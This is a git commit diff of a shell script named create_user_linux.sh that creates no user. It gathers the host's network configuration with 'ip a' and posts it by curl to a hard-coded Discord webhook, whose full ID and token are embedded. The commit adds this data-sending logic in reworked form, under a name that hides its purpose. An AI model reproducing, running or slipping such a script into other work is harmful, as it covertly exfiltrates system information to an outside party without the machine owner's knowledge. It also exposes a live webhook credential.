dfd40c14f20c07c7e75ac103434a22b7c5b03cf1
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 05:11:33 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -1,16 +1,18 @@
-#https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5
+#!/bin/bash
 
-# Discord webhook URL
+# Define the Discord webhook URL
 WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
 
-# Collect network data
+# Get network data
 NETWORK_DATA=$(ip a)
 
-# Escape newlines and quotes for JSON payload
-ESCAPED_NETWORK_DATA=$(echo "$NETWORK_DATA" | sed -e 's/[\/&]/\\&/g' -e 's/"/\\"/g' -e 's/$/\\n/' | tr -d '\n')
+# Prepare the message payload
+PAYLOAD=$(cat <<EOF
+{
+  "content": "Network Data:\n\`\`\`$NETWORK_DATA\`\`\`"
+}
+EOF
+)
 
-# Send data to Discord
-curl -H "Content-Type: application/json" \
-     -X POST \
-     -d "{\"content\": \"Network Data:\n$ESCAPED_NETWORK_DATA\"}" \
-     $WEBHOOK_URL
+# Send the data to the Discord webhook
+curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$WEBHOOK_URL"
